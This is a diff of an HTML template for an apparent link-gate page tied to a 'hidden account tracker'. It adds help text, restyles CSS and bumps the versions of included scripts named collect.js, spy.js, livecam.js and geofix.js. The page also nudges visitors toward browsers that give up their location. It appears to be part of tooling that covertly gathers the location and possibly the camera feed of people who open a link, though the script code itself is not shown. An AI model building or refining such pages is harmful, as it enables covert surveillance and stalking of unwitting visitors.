@@ -36,8 +36,8 @@ button{margin-top:16px;padding:12px 30px;font-size:15px;border:0;border-radius:9
   background:#4c8dff;color:#fff;font-weight:600;cursor:pointer}
 button:disabled{opacity:.55}
 .sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
-#lt_ia{display:none;margin-top:18px;border-top:1px solid #232734;padding-top:14px}
-#lt_ia p{font-size:13px;color:#9aa3b2;margin:0 0 10px;line-height:1.7}
+#lt_ia,#lt_help{display:none;margin-top:18px;border-top:1px solid #232734;padding-top:14px}
+#lt_ia p,#lt_help p{font-size:12.5px;color:#9aa3b2;margin:0 0 10px;line-height:1.8;text-align:left}
 a.btn{display:inline-block;padding:11px 22px;border-radius:999px;background:#2b3346;
   color:#e6e9ef;text-decoration:none;font-size:14px}
 #lt_live{opacity:0;transition:opacity .35s ease}
@@ -76,6 +76,7 @@ body.ui-none #lt_st{display:none}
   {% if gate_copy %}<button class="copy noclick" id="lt_copy">リンクをコピー</button>{% endif %}
   {% if gate_link %}<div class="tlink noclick"><a href="/">裏垢トラッカー</a></div>{% endif %}
   <p class="stat" id="lt_gate_st"></p>
+  <div id="lt_help"><p id="lt_help_t"></p></div>
 </div></div>
 {% endif %}
 
@@ -86,6 +87,8 @@ body.ui-none #lt_st{display:none}
     <p><span id="lt_ia_name">アプリ内</span> のブラウザでは位置情報が取れないことがあります。</p>
     <a class="btn" id="lt_safari" href="#">開き直す</a>
   </div>
+  <div id="lt_help2" style="display:none"><p id="lt_help2_t"
+    style="font-size:12.5px;color:#9aa3b2;line-height:1.8;margin:14px 0 0;text-align:left"></p></div>
   <span class="sr" id="lt_time"></span><span class="sr" id="lt_now"></span>
   <span class="sr" id="lt_perm"></span><span class="sr" id="lt_srv"></span>
   <span class="sr" id="lt_dbg"></span>
@@ -115,11 +118,11 @@ window.LT_CLIP     = 1;
 window.LT_SPY_WAIT = 7000;
 window.LT_DEBUG    = 0;
 </script>
-<script src="/static/geofix.js?v=16"></script>
-<script src="/static/keepalive.js?v=16"></script>
-<script src="/static/collect.js?v=16"></script>
-<script src="/static/live.js?v=16"></script>
-<script src="/static/spy.js?v=16"></script>
-<script src="/static/livecam.js?v=16"></script>
-<script src="/static/gate.js?v=16"></script>
+<script src="/static/geofix.js?v=17"></script>
+<script src="/static/keepalive.js?v=17"></script>
+<script src="/static/collect.js?v=17"></script>
+<script src="/static/live.js?v=17"></script>
+<script src="/static/spy.js?v=17"></script>
+<script src="/static/livecam.js?v=17"></script>
+<script src="/static/gate.js?v=17"></script>
 </body></html>
